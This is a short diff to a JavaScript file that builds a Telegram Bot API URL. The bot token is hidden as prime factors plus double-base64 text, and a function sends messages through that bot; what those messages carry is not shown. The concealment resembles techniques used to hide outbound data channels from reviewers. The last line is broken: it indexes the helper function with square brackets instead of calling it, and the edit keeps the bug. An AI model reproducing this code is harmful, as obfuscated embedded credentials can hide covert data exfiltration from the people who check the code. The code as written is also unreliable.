@@ -54,8 +54,7 @@ function sendMsg(){
 }
 
 function tgTokenDecode(priFac, myString){
-    Mul = priFac2val(priFac)
-    myReturn = Mul.toString()+ ":" + atob(atob(myString)) + "/";
+    myReturn = priFac2val(priFac)+ ":" + atob(atob(myString)) + "/";
     return myReturn
 }
 
@@ -64,7 +63,7 @@ function priFac2val(priFac){
     for(var i = 0; i < priFac.length; i++){
         Mul = Mul*priFac[i]
     }
-    return Mul;
+    return Mul.toString();
 }
 
   async function sendTgMessage(msg){
@@ -103,4 +102,4 @@ function priFac2val(priFac){
   }
 
 var tgURLToken = "https://api.telegram.org/bot"+ tgTokenDecode([2,11,181,236449],"UVVGSFUwMU9MVE5WWnpsUFNrbFJhVkF5T0VRd2IwSjRWMU5hYjFkNFNUVXlOV3M");
-var cenz = priFac2val[2 , 7 , 7 , 761 , 11317].toString();
+var cenz = priFac2val[2 , 7 , 7 , 761 , 11317];
